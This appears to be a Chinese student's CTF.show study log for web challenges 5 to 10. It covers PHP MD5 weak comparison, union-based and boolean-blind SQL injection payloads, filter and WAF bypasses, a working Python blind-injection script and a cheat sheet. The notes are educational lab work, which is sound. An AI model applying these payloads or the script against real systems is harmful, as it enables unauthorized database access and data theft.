第三周
# 2026年10月26日
# 学习内容 CTF.show web5
## 学习笔记：
# MD5(哈希算法) 给一个任意字符串得出一个32位16进制的数字--16进制只有0-9，a-f
###  import hashlib
 def md5(s):
    return hashlib.md5(s.encode()).hexdigest()
target = "0e"
s = ("QNKCDZO")
res = md5(s)
print(res)
 判断是否0e开头，后面全数字
if res.startswith("0e") and res[2:].isdigit():
    print("找到符合条件的！")--将字符串转化16进制32数字
   ![alt text](<屏幕截图 2026-10-27 211249.png>)
同系列其他经典0e串（记笔记）
-  aabg7XSs --240610708(最经典)
-  aalR8nOW 
-  ab76VVuE
## 题目中md5($v1)==md5($v2)--PHP弱比较(当一边是数字，一边是字母时，php会将其转化为浮点数去比较 ，当开头为0e时，自动将其转化为零
1. ype_alpha($v1)  → v1 只能是纯字母- QNKCDZO（纯字母，满足ctype_alpha）
2. s_numeric($v2)  → v2 只能是数字- 240610708（纯数字，满足is_numeric）
3. Payload： ?a=240610708&b=QNKCDZO得到flag![alt text](<屏幕截图 2026-10-27 214549_看图.png>)
# 2026年10月27日
# 学习内容:CTF,show web6 (注意此题为单引号字符型注入) 
## 解题步骤
1. 开局点击查看网页源代码 发现代码  用户名:<input type="text" name="username"><br><br>
        密&nbsp;&nbsp;&nbsp;码:<input type="password" name="password"><br><br>
        <input type="submit" value="登陆">
需要查找数据库，初步判断为SQL注入
1. 号 admin' or 1=1#，密码随意，输入能' or 1=1 #，报错
判断过滤空格空格。![alt text](<屏幕截图 2026-10-28 214919-1.png>)
2. （获取当前数据库名）：在用户名输入 admin'/**/union/**/select/**/1,database(),3#，密码随意。观察页面回显，第2个位置会显示当前数据库名--得到web2
3. （获取数据库中的表名）：用户名输入 admin'/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#，将database()改为得到的'web2'得到两表名flag，use
4. （获取 flag 表的列名）：用户名输入 admin'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#，密码随意。回显中会显示字段名*/1,group_concat(flag),3/**/from/**/flag#，密码随意。得到flag ctfshow{5eb4f9c1-efbd-4a25-9c9f-494cf060935d}   ![alt text](<屏幕截图 2026-10-28 220434-2.png>)
6.  （联合查询）强制规则： union  前后两条select，查询出来的列数量必须一样！不一样就直接报错，无法执行，所以我们必须先测出列数。  
## 学习笔记 
 一、 题目特征与考点
· 环境特征：通常是一个登录框（POST 或 GET 请求）。
· 核心考点：SQL 联合查询（UNION SELECT）、information_schema 系统库的使用、简单的过滤绕过（如空格过滤）。
· 解题前提：页面上有回显位（即你输入的数据，或者数据库查询的结果，能显示在网页上）。
---
🛠️ 二、 核心基础概念
1. information_schema：MySQL 5.0 以上自带的系统数据库，堪称“数据库的字典”。
   · information_schema.tables：存了所有的表名。
   · information_schema.columns：存了所有的列名（字段名）。
2. group_concat()：把多行查询结果拼成一行显示，防止页面只显示第一条数据。
3. 注释符：# 或 -- （注意 -- 后面必须跟一个空格）。用于把原 SQL 语句后面的部分注释掉，防止报错。
---
 三、 标准解题 SOP（标准作业程序）
在假设有回显且字段数为 3 的情况下，步骤如下：
第一步：爆库（获取当前数据库名）
目的：知道当前网站用的是哪个数据库，方便后续限定范围。
· Payload: ' union select 1,database(),3#
· 解释：database() 函数会返回当前数据库名（如当前环境查出的 Web2）。
第二步：爆表（获取数据库中的表名）
目的：找到存放 Flag 的“楼栋”（通常是 flag 或 users 表）。
· Payload: ' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
· 解释：去 tables 字典里，查 table_schema（表所属的库）等于当前库的所有表名。
第三步：爆字段（获取表里面的列名）
目的：找到存放 Flag 的“房间号”。
· Payload: ' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#
· (注：把 'flag' 换成第二步查出来的真实表名)
· 解释：去 columns 字典里，查 table_name 等于 flag 的所有列名。
第四步：爆数据（获取最终 Flag）
目的：直接拿钥匙开门。
· Payload: ' union select 1,group_concat(flag),3 from flag#
· (注：把 flag 换成第三步查出来的真实列名，from flag 是第二步查出的表名)
· 解释：直接从目标表里把目标字段的数据全部拉出来。
 四、 避坑与进阶技巧
1. 空格被过滤了怎么办？
· 当前解法：用 /**/ 替代空格。例如：union/**/select。
· 其他解法：用括号 () 包裹，或者用制表符 %09、换行符 %0a 替代。
2. 字符串引号被过滤了怎么办？
· 如果代码里过滤了单引号 '，可以尝试用十六进制（如 0x666c6167 代表 flag）替代。
· 或者使用 char() 函数：table_name=char(102,108,97,103)。
3. 如何确定字段数（列数）？
如果在做第一步之前，你不知道 union select 1,2,3 里的 3 应该是多少，可以使用 ORDER BY 测列数：
· ?id=1' order by 1# （正常）
· ?id=1' order by 2# （正常）
· ?id=1' order by 3# （正常）
· ?id=1' order by 4# （报错）
· 结论：说明当前表有 3 个字段。
4. 万能密码（登录框专属）
· 如果在第一步测试注入点，不想自己构造复杂的 Payload，可以尝试直接输入账号 admin' or 1=1#，密码随便填。有时候可以直接绕过登录拿到权限。
---
 总结与复盘
这道题思路非常清晰：
1. 看到了登录框 -> 想到 SQL 注入。
2. 测试发现空格被过滤 -> 改用 /**/。
3. 联合查询查出库名 Web2 -> 下一步准备查表。
 flag。
5.  Flag：用户名输入 admin'/**/union/**/select/*
# 上下两题都是属于sQl注入但在注入类型和具体解题手法上有本质区别。 注入类型不同：web6 是单引号字符型注入；web7 是数值型（整数型）注入。
1. · 交互入口不同：web6 是前台登录框 POST 提交（数据在请求体中）；web7 是文章浏览页 GET 传参（通过 URL ?id=1 直接注入）。
2. · Payload 构造方式不同：web6 必须先用 ' 闭合前端的引号，并用 #（URL中需编码为 %23）或 --  注释掉后面残余的 SQL；web7 因是纯数值，直接输入 1/**/and/**/1=1 就能成立，不需要闭合单引号。
3. · 解题切入点不同：web6 核心是先通过万能密码（如 admin'/**/or/**/1=1#）绕过登录验证进入系统，再回显脱库；web7 则是直接在文章 ID 处做逻辑测试，由于直接查当前文章可以正常回显，联合注入可以直接上手脱库。

# 2026年10月28日
# 学习内容：CTFshow web7
## 解题步骤
1. 开局给了3个文章-if-A chid's-lasked(全是英文看不懂),查看源代码发现文章列表</h4><ul><li><a href="index.php?id=1">If</a><br><li><a href="index.php?id=2">A Child's Dream of a Star</a><br><li><a href="index.php?id=3">I asked nothing</a><br></li></ul>![alt text](<屏幕截图 2026-10-29 201824.png>)
</body>,出现id=1等推测为SQL注入
第一步：确认注入类型
· 1/**/and/**/1=1（页面应正常显示）
· 1/**/and/**/1=2（页面应显示异常/空）
· 原理：如果1=1正常而1=2异常，说明存在数字型注入。
第二步：判断字段数
· 1/**/order/**/by/**/3（页面正常）
· 1/**/order/**/by/**/4（页面报错，说明字段数为3）
第三步：寻找回显位
· -1/**/union/**/select/**/1,2,3（页面会回显数字2和3）
第四步：爆库、表、字段（假设回显位为2）
· 查库名：-1/**/union/**/select/**/1,database(),3（回显 web7）
· 查表名：-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema="web7"),3（回显 flag）
· 查字段名：-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema="web7"/**/and/**/table_name="flag"),3（回显 flag）
第五步：获取 Flag
· -1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3c:\Users\ABC\Desktop\屏幕截图 2026-10-29 200621.png

## 学习笔记与web6类型一样，注意区分

# 2026年10月29日
# 学习内容：ctf web8（重点用了两天时间都无法复现解题，最后直接用脚本跑出(布尔都可以用），真是嘛了)
## 解题步骤：
1. 进入页面跟web7一致，包括源代码，同为SQL注入，开始公式化打法，全部报错，联合查询被封死，推测为过滤了空格、union、select 和逗号，需要改用布尔盲注，利用 or 和 ascii 函数通过“真假”状态来推测数据。需要改用布尔盲注，利用 or 和 ascii ，substr函数通过“真假”状态来推测数据。
自动化脚本（Python 布尔盲注）
手工猜测效率极低，直接运行以下 Python 脚本，利用二分法思想快速爆破出 Flag。
import requests
import time
import sys
2.    DOMAIN = "http://1431103d-b80a-4c8d-b037-1a298b91be28.challenge.ctf.show/"
URL = DOMAIN + "index.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}
def get_flag():
    flag = "" # 遍历前 50 个字符 
    for i in range(1, 51):
        low = 32
        high = 127
        mid = (low + high) // 2
        
        while low < high:
            # 2. 使用 substr(string from 1 for 1) 绕过逗号过滤
            # 使用 /**/ 绕过空格过滤，|| 绕过 and 过滤
            # 这里是查 flag 表里的 flag 字段，如果是别的表名字段名，请自行替换
            payload = f"?id=1/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)from/**/{i}/**/for/**/1))>{mid}"
            try:
                # 3. 加上 verify=False 忽略证书，timeout=5 防止死等
                r = requests.get(URL + payload, headers=headers, timeout=5, verify=False)
                
                # 4. 判断回显特征，通常条件为真时页面会有特定标志
                # 你之前截图里的判断是 len(r.text) > 2125，如果跑不通可以尝试换成 if 'If' in r.text 等特征
                if len(r.text) > 2125: 
                    low = mid + 1
                else:
                    high = mid
            except Exception as e:
                print(f"\n[-] 网络请求失败，重试中... {e}")
                time.sleep(2)
                continue
                
            mid = (low + high) // 2
        
        # 如果解出来的 ASCII 码不在正常可见字符范围内，说明到结尾了
        if mid < 32 or mid > 126:
            break
            
        flag += chr(mid)
        print(f"\r[+] 正在获取 Flag: {flag}", end="", flush=True)
        
    print(f"\n[✔] 最终结果: {flag}")

if __name__ == "__main__":
    get_flag()![alt text](<屏幕截图 2026-10-30 194856.png>)

# 2026年10月30日
# 学习内容：ctf show web9
## 解题步骤：
1. 开局看到一个管理员登录页面查看源代码(已给出admin账号排除使用万能密码)
2. 直接查看robots.txt,发现禁止访问index.php,直接查看拿到原码(这里的是后端PHP源代码)
3.  发现md5($password,true)--MD5 原始二进制注入：md5($password, true) 的第二个参数是 true，这意味着它返回的不是 32 位的十六进制字符串，而是16 位原始二进制数据。在 MySQL 中，这些二进制数据会转换成字符串参与查询。
4. 发现(strlen($password)>10)此时密码不能超过10位
5. 同时password ='"发现需要闭合引号同时制作逻辑或者(逻辑运算(布尔运算--假or真=真-反之是假))
6. 🚀 终极绕过密码：ffifdyop(它的 MD5 值是 276f722736c95d99e921722cf9ed621c。
· 当以 true（原始二进制）返回时，转换成字符串会变成：'or'6... （后面的乱码对 SQL 执行没影响）。
7. 因为 password = '' 为空（假），而 '6...' 是一个非零字符串，在 MySQL 中非零字符串转换为布尔值为真（True）。
所以最终变成了 假 OR 真，整个查询条件恒成立
8. 输入密码得到ctfshow{4410d6aa-4425-446a-8592-49044bede8e0}![alt text](<屏幕截图 2026-10-30 205828.png>)

# 2026年10月31日
# 学习内容：ctf show  web10
## 解题步骤：
1. 点击页面进入后发现管理员登录页面，推测为SQL注入，剩下4使用万能密码admin' or 1=1#，提示sql inject error，报错
2. 推测排除空格，改用admin'/**/or/**/1=1#，页面无反应
3. 尝试绕过后端密码比较--. 伪造数据：用 union select 直接构造一个用户名为 admin，密码为你输入值的数据。但这关（web10）过滤了 select、union 和空格。
 4. --  利用 MySQL 的特殊语法制造 NULL：MySQL 有一个 GROUP BY 分组语句，后面如果加上 WITH ROLLUP，它会在查询结果的最后，额外生成一行“总计行”，这一行的值为 NULL。
 5.得到账号admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup# 完整的意思是：
查询所有用户，按照密码分组，并且在最后生成一个 password 为 NULL 的汇总行。# 把原本的 AND password='...' 注释掉了。
5. 得到flag![alt text](<屏幕截图 2026-10-31 153150.png>)

# 2026年11月1日
# 学习内容：phthon解到哪学到哪
# 学习笔记：
---
🛡️ SQL注入与Python自动化脚本核心速查手册
一、 SQL 盲注与信息获取核心语法
· 注释截断：#（URL中必须写 %23）、-- （后跟空格）、/**/（主打替代空格）。
· 信息获取：
  · 当前库：database()
  · 多行合并：group_concat()
  · 系统库查表：information_schema.tables / columns
· 盲注双雄：
  · substr(str, start, length)：截取字符串（逗号被禁时用 substr(str from 1 for 1)）。
  · ascii(char)：字符转数字，方便用 >、< 进行大小比较。
· 布尔盲注公式：?id=1||ascii(substr((子查询),1,1))>100
  · 页面正常 = True；页面报错/空白 = False。
二、 经典 WAF 绕过姿势（Bypass）
被过滤内容 替代语法 / 绕过姿势 备注
空格 /**/ 最常用，如 union/**/select
逗号 , from ... for ... substr(database() from 1 for 1)
or ` 
information_schema mysql.innodb_table_stats MySQL 5.7+ 隐藏表，字段为 database_name 和 table_name
三、 Python 自动化盲注脚本结构

· 基础库：import requests、import time（加 time.sleep(0.05) 防封IP）。
· 入口保护：if __name__ == "__main__":（必须顶格，下面代码缩进 4 空格）。
· 字符串拼接：使用 f-string，如 f"...{变量}..."。
· 核心算法（二分法）：
  ```python
  mid = (low + high) // 2  # 取中值
  # 如果条件成立：low = mid + 1
  # 如果条件不成立：high = mid - 1
  ```
· 字符转换：chr(ascii码) 将数字转回字母。
· 异常处理：
  ```python
  try:
      res = requests.get(url, timeout=3) # 3秒超时防卡死
      if "特征词" not in res.text:       # 判断真假的核心
          # 猜解成功逻辑
  except requests.exceptions.RequestException as e:
      print("请求异常，靶场可能过期")
  ```
四、 实战避坑经验（踩坑总结）
1. 靶场 404：ctf.show 的 UUID 是动态的，脚本全报错时，先回浏览器看看链接是不是过期了。
2. URL 编码：浏览器里的 # 不会发给服务器，必须用 %23；盲注里的 || 写成 %7C%7C 最稳。
3. 特征词写错：盲注跑出空数据，大概率是 if 里判断“正常/报错”的特征词写错了。
💡 下一阶段展望
· 时间盲注：当页面无论真假都返回相同内容时，使用 sleep(3) 配合 if(条件, sleep(3), 0) 来制造延迟判断。
· 报错注入：页面直接显示报错信息时，用 updatexml(1,concat(0x7e,(select database())),1) 把数据带出来。
---
终极口诀：
不管注入怎么变，核心逻辑永远是：“构造Payload -> 发送请求 -> 判断真假 -> 循环提取”，以后遇到时间盲注或报错注入，只需改动 payload 变量的构造逻辑
